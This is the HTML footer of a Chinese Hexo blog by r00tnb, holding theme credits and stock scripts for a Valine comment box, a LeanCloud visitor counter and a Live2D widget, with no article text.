  <span class="author" itemprop="copyrightHolder">r00tnb</span>

  

  
</div>



<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>
<span class="post-meta-divider">|</span>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>




<span class="post-meta-divider">|</span>
<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共51.3k字</span>
</div>
        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  



  








  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  
  
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(function (item) {
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'P8D4CJcWbjzgBylpfKakij6f-gzGzoHsz',
        appKey: 'sGWk5EsR6zF5YIBJ7qqlkMHt',
        placeholder: 'Just go go',
        avatar:'mm',
        meta:guest,
        pageSize:'10' || 10,
        visitor: false
    });
  </script>



  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("P8D4CJcWbjzgBylpfKakij6f-gzGzoHsz", "sGWk5EsR6zF5YIBJ7qqlkMHt");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            
            counter.save(null, {
              success: function(counter) {
                
                  var $element = $(document.getElementById(url));
                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
                
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            
              var newcounter = new Counter();
              /* Set ACL */
              var acl = new AV.ACL();
              acl.setPublicReadAccess(true);
              acl.setPublicWriteAccess(true);
              newcounter.setACL(acl);
              /* End Set ACL */
              newcounter.set("title", title);
              newcounter.set("url", url);
              newcounter.set("time", 1);
              newcounter.save(null, {
                success: function(newcounter) {
                  var $element = $(document.getElementById(url));
                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
                },
                error: function(newcounter, error) {
                  console.log('Failed to create');
                }
              });
            
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  

  
  

  

  

  

  

  

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
